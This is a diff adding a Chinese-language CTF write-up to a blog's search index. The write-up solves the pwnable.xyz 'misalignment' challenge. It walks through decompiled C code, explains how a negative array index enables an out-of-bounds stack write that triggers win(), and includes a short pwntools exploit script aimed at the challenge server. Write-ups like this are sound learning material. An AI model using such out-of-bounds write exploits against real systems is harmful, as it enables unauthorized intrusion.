@@ -1571,4 +1571,41 @@
         <tag>PWN</tag>
       </tags>
   </entry>
+  <entry>
+    <title>misalignment</title>
+    <url>/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/misalignment/</url>
+    <content><![CDATA[<p><strong></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/misalignment/8.png" class></strong></p>
+<h3 id="检查文件保护措施"><a href="#检查文件保护措施" class="headerlink" title="检查文件保护措施"></a>检查文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/misalignment/1.png" class></strong></p>
+<p>文件为64位小端序</p>
+<h3 id="查看c语言源文件"><a href="#查看c语言源文件" class="headerlink" title="查看c语言源文件"></a>查看c语言源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  _QWORD v5[<span class="number">3</span>]; <span class="comment">// [rsp+18h] [rbp-98h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-78h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setup(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x98</span>uLL);</span><br><span class="line">  *(_QWORD *)((<span class="keyword">char</span> *)v5 + <span class="number">7</span>) = <span class="number">3735928559L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)_isoc99_scanf(<span class="string">&quot;%ld %ld %ld&quot;</span>, &amp;v6, &amp;v7, &amp;v8) == <span class="number">3</span> &amp;&amp; v8 &lt;= <span class="number">9</span> &amp;&amp; v8 &gt;= <span class="number">-7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v8 + <span class="number">6</span>] = v6 + v7;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %ld\n&quot;</span>, v5[v8 + <span class="number">6</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)((<span class="keyword">char</span> *)v5 + <span class="number">7</span>) == <span class="number">0xB000000B5</span>LL )</span><br><span class="line">    win();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路很清晰，使得<code>*(v5 + 7)==0xB000000B5</code>即可运行win函数获得Flag。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/misalignment/3.png" class></strong></p>
+<p>注意以下几点：</p>
+<p>1、数组v5长度为<code>98h-80h = 18h = 24Byte</code>,因此每个元素占<code>24/3 = 8Byte</code></p>
+<p>2、v6/v7/v8 是int64，占8字节。</p>
+<p>3、接受任何输入之前v5的状态：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/misalignment/2.png" class></strong></p>
+<p>因为将v5强制类型转为一个(char *)类型的指针，因此指针加一代表移动1个字节。</p>
+<p>4、我们需要将内存改写为：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/misalignment/4.png" class></strong></p>
+<p>因此，在内存中将<code>v5 [0]放置0xb500000000000000，v5 [1]放置0x0b000000</code>,由于每次只能向内存中写入8字节的数据，考虑到内存对齐，只能从<code>v5[0]和v5[1]</code>的地方分两次写入，因为用户不能自己进行强制类型转换。写入v5[0]则将v8设置为-6，写入v5[1]将v8设置为-5。</p>
+<p>5、要求输入的数为整型：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/misalignment/5.png" class></strong></p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/misalignment/6.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;./challenge&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;svc.pwnable.xyz&#x27;</span>,<span class="number">30003</span>)</span><br><span class="line"><span class="comment">#sh.recv()</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;-5404319552844595200 0 -6&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;184549376 0 -5&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/misalignment/7.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.xyz</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
 </search>
